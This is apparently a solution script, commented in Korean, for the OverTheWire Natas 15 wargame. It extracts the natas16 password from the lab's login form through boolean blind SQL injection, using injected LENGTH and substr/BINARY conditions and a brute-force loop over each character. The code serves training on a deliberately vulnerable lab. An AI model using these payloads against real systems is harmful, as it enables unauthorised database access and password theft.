#----------------------------------------------------------
# 여기는 blind_sqli를 위해 POC를 통해 연습해야만 합니다.
# 비밀번호 길이는 아래처럼 함수를 통해 찾을 필요는 없습니다만 일반적으로 길이를 찾는 것부터 시작합니다.
# 아이디 형식의 경우가 natas[단계] ex) natas15, natas16 등 이런 식이라 여기서도 저는 유추해서 natas16을 넣어 먼저 수동으로 유저 이름을 확인하였습니다.
#----------------------------------------------------------

import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"
#natas15의 비밀번호는 이전 단계에서 얻어서 대입하세요
natas15_cred = ""

s = requests.Session()
s.auth = ("natas15", natas15_cred)

username = 'natas16'

# 비밀번호 자릿수를 확인하기 위해, LENGTH를 통해 숫자를 1~32까지 반복시켜서 확인하는 함수.
# 실질적으로 이걸 하지 않더라도 여기선 비밀번호가 32자리로 고정한다는 정보를 하다보면 알 수 있어.  이렇게 돌려보지 않아도 됨.
#(생략가능)
def brut_length(username):
  for i in range(1, 33):
    data = {"username": f'{username}" AND LENGTH(password) = {i} #'}
    response = s.post(url, data=data)
    
    if "This user exists." in response.text:
      print(f"[+]DB에 존재하는 비밀번호 자릿수는 {i}개 입니다.")
      return i
     
  print("[-]범위에 해당하는 길이가 아니니 늘려라")
  return None

#(생략 가능)

# 비밀번호 자릿수 출력
length = brut_length(username)

# 만약 위 함수 생략 시, 아래로 처럼 비밀번호 설정하고 하면됨
#length = 32



# blind_sqli를 실행하는 함수
def blind_sqli_exploit(username, length):
  # 나타스의 경우 비밀번호가 대소문자, 숫자로 이루어지기 때문에, 아래와 같이 모듈을 사용하여 기준이 되는 캐릭터셋을 생성
  char_set = string.ascii_letters + string.digits 
  password = ""

  # 반복을 통해 비밀번호 자릿수만큼 반복
  for pos in range(1, length+1):
    # 기준이 되는 캐릭터에서 해당 자리에 맞는 문자가 나올때까지 계속 대입  
    for ch in char_set:
      # 여기서 BINARY를 넣지 않으면 나타스에선 적어도 대소문자 구분을 안해서 오류 발생('a' == 'A' 취급) 
      payload = f'{username}" AND substr(password, {pos}, 1) = BINARY "{ch}" #'
      data = {"username": payload}
      
      response = s.post(url, data=data)

      # 올바른 입력이면 This user exists가 나오기 때문에, password 변수에 넣고 저장해가며 끝까지 다음 자릿수로 넘어감
      if "This user exists." in response.text:
        password += ch
        # 전체적으로 화면에 하나씩 출력
        print(f"[+]{pos}번째 문자: {ch}")
        break
  
  return password

#출력된 전체 비밀번호 변수에 저장
natas16_password = blind_sqli_exploit(username, length)

# 전체 비밀번호 화면에 출력
print("=" * 60)
print(f"[+]{username}의 최종 비밀번호: {natas16_password}")
print("=" * 60)
